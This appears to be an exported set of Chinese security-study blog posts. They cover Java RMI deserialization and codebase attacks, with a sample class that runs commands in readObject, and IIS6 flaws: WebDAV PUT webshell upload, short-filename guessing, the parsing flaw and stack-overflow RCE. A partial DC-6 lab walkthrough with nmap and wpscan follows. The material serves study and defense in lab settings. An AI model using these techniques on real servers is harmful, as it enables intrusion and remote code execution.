<h3 id="RMI实现流程"><a href="#RMI实现流程" class="headerlink" title="RMI实现流程"></a>RMI实现流程</h3><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img"></p>
<h4 id="1-创建接口"><a href="#1-创建接口" class="headerlink" title="1.创建接口"></a>1.创建接口</h4><p>在创建对象类之前，我们首先需要创建一个空接口，接口需要继承<code>java.rmi.Remote</code>。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205736.png" alt></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public<span class="built_in"> interface </span>Services extends java.rmi.Remote &#123;</span><br><span class="line">    Object sendMessage(Message msg) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-实现接口"><a href="#2-实现接口" class="headerlink" title="2.实现接口"></a>2.实现接口</h4><p>接着我们实现这个接口，创建服务端对象类，实现的类必须继承UnicastRmeoteObject。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205829.png" alt></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.<span class="type">RemoteException</span>;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.<span class="type">UnicastRemoteObject</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ServicesImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="title">implements</span> <span class="title">Services</span> </span>&#123;</span><br><span class="line">    public <span class="type">ServicesImpl</span>() <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public <span class="type">Object</span> sendMessage(<span class="type">Message</span> msg) <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-创建服务端-amp-amp-注册中心"><a href="#3-创建服务端-amp-amp-注册中心" class="headerlink" title="3.创建服务端&amp;&amp;注册中心"></a>3.创建服务端&amp;&amp;注册中心</h4><p>创建一个RMI服务端，服务端和客户端需要有共同的接口。然后创建注册中心，启动 <code>RMI</code> 的注册服务。<strong>server端将实例化的服务端远程对象绑定到registry</strong></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.AlreadyBoundException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.RemoteException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.LocateRegistry;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.Registry;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">            ServicesImpl obj = <span class="keyword">new</span> ServicesImpl();</span><br><span class="line">            Registry registry = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 创建Registry</span></span><br><span class="line">                registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">                System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Using existing registry"</span>);</span><br><span class="line">                registry = LocateRegistry.getRegistry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绑定远程对象到Registry</span></span><br><span class="line">            registry.bind(<span class="string">"Services"</span>, obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205801.png" alt></p>
<p><strong>注意:</strong>低版本的JDK中，server服务端和register注册中心可以不在一台服务器上，高版本则只能在一台服务器上。</p>
<h4 id="4-创建客户端"><a href="#4-创建客户端" class="headerlink" title="4.创建客户端"></a>4.创建客户端</h4><p>客户端与server和registry交互。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package me.mole.javarmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 获取远程对象的引用</span></span><br><span class="line">        Services services = (Services) registry.lookup(<span class="string">"Services"</span>);</span><br><span class="line">        VulObject malicious = <span class="keyword">new</span> VulObject();</span><br><span class="line">        malicious.setParam(<span class="string">"calc.exe"</span>);</span><br><span class="line">        malicious.setMessage(<span class="string">"hacked by m01e"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用远程对象的引用调用对应的方法</span></span><br><span class="line">        System.out.<span class="built_in">println</span>(services.sendMessage(malicious));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205817.png" alt></p>
<p>我们在客户端这里创建一个恶意的命令执行的类VulObject。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulObject</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7398165783113471324L</span>;</span><br><span class="line">    <span class="keyword">private</span> String param;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParam</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.param = param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="本地获取注册中心-反序列化点"><a href="#本地获取注册中心-反序列化点" class="headerlink" title="本地获取注册中心(反序列化点)"></a>本地获取注册中心(反序列化点)</h4><p>获取注册中心的两种方式。</p>
<ul>
<li>创建时获取:LocateRegistry#createRegistry</li>
<li>远程获取:LocateRegistry#getRegistry</li>
</ul>
<p>无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的RegistryImpl对象进行调用。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204152056.png" alt></p>
<p>我们这里分析下调用 <code>LocateRegistry</code> 类的 <code>getRegistry</code> 方法。</p>
<p>调用通过<code>getRegistry</code> 方法得到的<code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204144136.png" alt></p>
<p>这里首先通过<strong>newCall</strong>方法调用 TCPChannel 类的 createConnection 方法创建 socket 连接和注册服务通信。</p>
<p>然后通过<strong>writeObject</strong>方法先后写入bind方法序列化的参数值。</p>
<p>然后通过调用serviceCall 方法，获取到dispatcher，最后调用registry.RegistryImpl_Skel类的dispatch方法。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204200612.png" alt></p>
<p>var3是传递过来的int类型的参数，在这里有如下关系的对应：</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<p>​     根据参数来决定服务端与客户端调用的方法。这个过程中基于序列化和反序列化来进行通讯的。那么我们就可以寻找反序列化的点来进行攻击。</p>
<h4 id="调用rmi执行反序列化攻击"><a href="#调用rmi执行反序列化攻击" class="headerlink" title="调用rmi执行反序列化攻击"></a>调用rmi执行反序列化攻击</h4><p>首先启动注册服务，然后执行服务端，最后执行客户端。可以发现客户端能够成功调用服务端上的方法，实现远程方法调用。</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204210147.png" alt></p>
<h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ul>
<li>服务端Clockmpl()继承Clock()创建对象。</li>
<li>服务端CLock()注册远程对象</li>
<li>客户端访问服务器b并查找相应远程对象。</li>
<li>服务端将stub(存根返回)客户端</li>
<li>客户端调用stub(存根)的方法</li>
<li>stub(存根)作为代理与服务端骨架通信//骨架作为服务端代理。</li>
<li>骨架代理调用Clockmpl相应方法。</li>
<li>骨架将结果返回给客户端的存根</li>
<li>存根返回给客户端。</li>
</ul>
<h5 id="P牛对注册中心的解释"><a href="#P牛对注册中心的解释" class="headerlink" title="P牛对注册中心的解释"></a>P牛对注册中心的解释</h5><p>​    RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调用。</p>
<h4 id="插一张先知的流程图"><a href="#插一张先知的流程图" class="headerlink" title="插一张先知的流程图"></a>插一张先知的流程图</h4><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/007S8ZIlly1gfz5kokqvgj30fe0if407.jpg" alt="img"></p>
<h3 id="RMI攻击手法"><a href="#RMI攻击手法" class="headerlink" title="RMI攻击手法"></a>RMI攻击手法</h3><p>先知社区上的一些总结，上图:</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/20200701101308-6810e0aa-bb40-1.png" alt="img"></p>
<p><strong>大致可以分为以下四类:</strong></p>
<ul>
<li><p>探测利用开放的RMI服务。</p>
</li>
<li><p>基于RMI服务反序列化过程的攻击。</p>
</li>
<li><p>利用RMI的动态加载特性的攻击利用。</p>
</li>
<li><p>结合JNDI注入。</p>
</li>
</ul>
<p>我们主要学习RMI结合反序列化攻击的相关内容。</p>
<h4 id="基于RMI服务反序列化过程的攻击"><a href="#基于RMI服务反序列化过程的攻击" class="headerlink" title="基于RMI服务反序列化过程的攻击"></a>基于RMI服务反序列化过程的攻击</h4><p>RMI反序列化漏洞的存在必须包含两个条件：</p>
<ol>
<li>能够进行RMI通信</li>
<li>目标服务器引用了第三方存在反序列化漏洞的jar包</li>
</ol>
<p>注：复现的时候需要JDK8 121以下版本，121及以后加了白名单限制。</p>
<h4 id="利用RMI的动态加载特性的攻击利用"><a href="#利用RMI的动态加载特性的攻击利用" class="headerlink" title="利用RMI的动态加载特性的攻击利用"></a>利用RMI的动态加载特性的攻击利用</h4><h5 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h5><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">&lt;applet code=<span class="string">"HelloWorld.class"</span> codebase=<span class="string">"Applets"</span> <span class="built_in">width</span>=<span class="string">"800"</span> <span class="built_in">height</span>=<span class="string">"600"</span>&gt;</span><br><span class="line">&lt;/applet&gt;</span><br></pre></td></tr></table></figure>

<p>​     codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。</p>
<p>​     如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，动态加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p>
<p>​     在RMI中，我们可以通过codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
<p><strong>但是相对而言这种限制条件很严：</strong></p>
<ul>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li>
</ul>
<p>这里使用这位师傅打包好的代码学习:<a href="https://github.com/fa1c0n1/rmi-attack-demo" target="_blank" rel="noopener">https://github.com/fa1c0n1/rmi-attack-demo</a></p>
<h5 id="客户端动态加载"><a href="#客户端动态加载" class="headerlink" title="客户端动态加载"></a>客户端动态加载</h5><ul>
<li>创建HTTP服务器，作为动态加载代码的远程仓库。</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">8000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>服务端创建远程对象，<code>RMI Registry</code>启动并完成名称绑定，并设置<code>java.rmi.server.codebase</code>。</li>
</ul>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204220949.png" alt></p>
<ul>
<li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>，并根据服务器返回的<code>java.rmi.server.codebase</code>远程加载动态所需的类。</li>
</ul>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221009.png" alt></p>
<h5 id="服务端动态加载"><a href="#服务端动态加载" class="headerlink" title="服务端动态加载"></a>服务端动态加载</h5><p>恶意的客户端代码：</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210209010010.png" alt></p>
<p>受害服务端代码：</p>
<p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221040.png" alt></p>
<h4 id="结合JNDI注入"><a href="#结合JNDI注入" class="headerlink" title="结合JNDI注入"></a>结合JNDI注入</h4><p>放到后面再细说。。(学晕了)</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p>
<p><a href="https://xz.aliyun.com/t/8644" target="_blank" rel="noopener">https://xz.aliyun.com/t/8644</a></p>
<p><a href="https://xz.aliyun.com/t/8706" target="_blank" rel="noopener">https://xz.aliyun.com/t/8706</a></p>
<p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p>
<p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7</a></p>
]]></content>
      <categories>
        <category>java代码审计学习</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>IIS中间件漏洞</title>
    <url>/2020/04/03/iis-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
<p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p>
<p>安装windows server 2003版本，准备iis写入工具，下载IIS6.0版本</p>
<p>2.复现过程：</p>
<p>我们首先在虚拟机中打开win server 2003 版本。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118185950.png" style="zoom:50%;">

<p>之后我们安装IIS6.0服务,进入网站配置界面</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118190925.png" style="zoom:50%;">

<p>打开webDAV服务配置  Active Server pages(允许解析asp文件)，提供文件写入权限。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118191122.png" style="zoom:33%;">

<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118191318.png" style="zoom: 50%;">

<p>我们尝试在物理机打开网站</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200118191510.png" alt></p>
<p>说明服务已开启。</p>
<p>我们打开iis写入工具。尝试写入test.txt文件。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118192007.png" style="zoom:50%;">



<p>发现提示“您未被授予查看该页”。</p>
<p>后来发现未开启来宾用户足够的权限</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118192257.png" style="zoom:50%;">

<p>我们再次尝试。成功写入。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118192408.png" style="zoom:50%;">

<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118192500.png" style="zoom:50%;">

<p>我们新建一个asp一句话木马文件，先命名为shell.txt,写入网站根目录下。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200118193312.png" alt></p>
<p>然后使用iiswrite的mv功能。首先我们需开启网站主目录下的脚本资源访问功能</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200118112701.png" alt></p>
<p>然后将根目录下的shell.txt修改为shell.asp</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118112855.png" style="zoom: 80%;">

<p>之后我们使用菜刀连接即可。</p>
<h4 id="IIS-短文件名猜解漏洞"><a href="#IIS-短文件名猜解漏洞" class="headerlink" title="IIS-短文件名猜解漏洞"></a>IIS-短文件名猜解漏洞</h4><p><strong>什么是短文件名？</strong></p>
<p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成对应的window 8.3短文件名。</p>
<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>  为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。<br> 在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p>
<p>​     攻击者使用通配符*和？发送一个请求到IIS，当IIS接收到一个文件路径中包含“~”请求时，返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们进入win server 2003的网站根目录下。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200118194442.png" style="zoom:67%;">

<p>在根目录下新建多个超过8个字符的文件名</p>
<p>​                   <img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200118144312.png" alt></p>
<p>我们在命令提示符使用 dir c:/x，即可看到我们创建的文件的短文件名。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200118144400.png" alt></p>
<p>我们在物理机上访问该网站并使用通配符猜解文件名。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202204523.png" alt></p>
<p>可以看到网页回显404，说明网站根目录存在所猜解的文件名。</p>
<img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ截图20200202204745.png" style="zoom:67%;">

<p>我们访问不存在的文件会报错。</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>升级.net framework</li>
<li>修改注册表键值：</li>
</ol>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202205239.png" alt></p>
<p>将数值数据改为1，1代表不创建短文件名格式。修改完成后，需要重启系统生效。</p>
<h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS-解析漏洞"></a>IIS-解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.</p>
<p>举例：/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p>
<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们在www下新建一个test.asp文件夹和test.jpg图像文件</p>
<p>在图像文件中写入任意字符。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202210506.png" alt></p>
<p>我们直接访问图像文件，发现无法成功解析。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202210532.png" alt></p>
<p>我们再将图片文件放入asp文件夹下重新尝试访问</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202210636.png" alt></p>
<p>发现网站将该文件解析成了asp文件进而成功执行。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200202210706.png" alt></p>
<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
<li>取消网站后台新建目录的功能，不允许新建目录。</li>
<li>对新建目录文件名进行过滤，不允许新建包含.的文件夹。</li>
</ul>
<h4 id="IIS远程代码执行"><a href="#IIS远程代码执行" class="headerlink" title="IIS远程代码执行"></a>IIS远程代码执行</h4><h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​    在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>1.漏洞环境搭建：</p>
<p>在windows server 2003 r2 32位上安装iis6.0</p>
<p>2.触发漏洞：</p>
<p>在本地执行exp</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/4-2-1.png" alt></p>
<p>执行成功后，服务器弹出计算器。</p>
<p><img src="/2020/04/03/iis-zhong-jian-jian-lou-dong/4-2-2.png" alt></p>
<h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.关闭webDAV服务</p>
<p>2.使用相关防护设备</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><h5 id="https-www-secpulse-com-archives-82410-html"><a href="#https-www-secpulse-com-archives-82410-html" class="headerlink" title="https://www.secpulse.com/archives/82410.html"></a><a href="https://www.secpulse.com/archives/82410.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/82410.html</a></h5><p><a href="https://www.aqniu.com/learn/43996.html" target="_blank" rel="noopener">https://www.aqniu.com/learn/43996.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45744757/article/details/104512683" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45744757/article/details/104512683</a></p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
      <tags>
        <tag>IIS中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6靶机</title>
    <url>/2020/03/31/dc-6-ba-ji/</url>
    <content><![CDATA[<h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
<p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209200455.png" alt></p>
<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用神器nmap对靶机IP进行探测。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.137</span> -T4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209200850.png" alt></p>
<p>我们发现靶机开放了22端口和80端口。</p>
<p>我们直接访问IP发现被重定向到了<a href="http://wordy。" target="_blank" rel="noopener">http://wordy。</a></p>
<p>我们编辑 /etc/hosts中的文件添加该域名</p>
<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200211113951.png" alt></p>
<p>我们再次尝试访问192.168.153.137发现成功跳转，</p>
<p>我们利用火狐自带插件进行指纹识别</p>
<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209201216.png" alt></p>
<p>我们可以确定该cms为WordPress，且数据库为MYSQL</p>
<h4 id="第三步、漏洞扫描"><a href="#第三步、漏洞扫描" class="headerlink" title="第三步、漏洞扫描"></a>第三步、漏洞扫描</h4><p>使用wordpress漏洞测试工具wpscan进行网站漏洞探测，wpscan是一款针对wordpress的黑盒漏洞扫描器，可以获得包括版本、主体、插件等信息。</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">http:</span><span class="comment">//Wordy -u t</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/31/dc-6-ba-ji/QQ%E6%88%AA%E5%9B%BE20200209201612.png" alt></p>
<p>通过扫描我们得到几个系统的用户名信息。我们接下来思考能否获得任一账号的密码。</p>
<h4 id="第四步、漏洞利用"><a href="#第四步、漏洞利用" class="headerlink" title="第四步、漏洞利用"></a>第四步、漏洞利用</h4><p>我们首先根据作者的提示，使用到kali里面的rockyou.txt字典</p>
<p>使用解压命令：</p>
